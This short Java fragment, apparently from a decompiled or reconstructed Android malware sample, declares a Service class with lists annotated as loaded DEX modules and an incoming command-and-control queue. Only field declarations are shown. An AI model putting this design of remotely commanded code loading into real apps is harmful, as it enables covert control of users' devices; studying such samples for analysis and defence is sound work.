...
public class love extends Service {
    ...
    public static List<DataHelper> loadedModules = new java.util.ArrayList<>();      // L_love_cl — loaded DEX module classes
    public static List<Config>     commandQueue = new java.util.ArrayList<>();       // L_love_i  — incoming C2 command queue
